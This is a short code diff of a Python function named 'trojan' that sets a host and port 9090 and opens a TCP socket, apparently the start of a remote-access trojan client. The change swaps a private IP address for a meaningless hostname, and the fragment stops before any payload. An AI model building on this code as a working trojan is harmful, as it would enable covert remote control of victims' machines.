@@ -1,7 +1,7 @@
 import socket
 
 def trojan():
-    HOST = '192.168.43.78'  # ip
+    HOST = 'dumbfounded122222'  # ip
     PORT = 9090             # check if port is free
     
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
